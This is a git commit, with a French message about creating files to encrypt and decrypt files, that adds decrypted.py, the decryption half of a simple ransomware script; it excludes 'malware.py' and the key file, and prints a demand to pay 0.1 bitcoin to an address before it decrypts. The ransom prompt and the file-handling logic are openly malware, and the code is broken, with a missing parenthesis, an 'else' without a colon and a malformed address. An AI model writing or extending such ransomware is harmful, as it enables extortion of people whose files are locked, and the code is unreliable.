083e1aabbb1e870155eea76ac1d2181e47799625
Laravel x React <antoine.theissenpro@gmail.com>
2023-02-13 16:07:02 +0100

    Création de 2 fichier pour encoder des fichier et les déencoder des fichier

---
+++ decrypted.py
@@ -0,0 +1,30 @@
+import os
+from cryptography.fernet import Fernet
+
+#Trouver des fichier
+
+files = []
+
+for file in os.listdir():
+    if file == "malware.py" or file == "thekey.key" or file == "decrypted.py":
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+
+print(files)
+with open ("thekey.key", "rb") as key:
+    secretkey =key.read()
+
+secret_phrase = "monster energy pipeline punch 500ml"
+user_phrase = input ("Enter a secret phrases to decrypt the files after you pay me 0.1 bitcoin at this adress '0x082838R8ufefuizh37493794948GHJEZHE383920' ")
+if secret_phrase == user_phrase :
+    for file in files:
+        with open(file, "rb") as thefile:
+            contents = thefile.read()
+        contents_decrypted = Fernet(secretkey).decrypt(contents)
+        with open(file, "wb") as thefile:
+            thefile.write(contents_decrypted
+        print("congrats youre files are decrypted")
+else
+        print("No still encrypted")
+
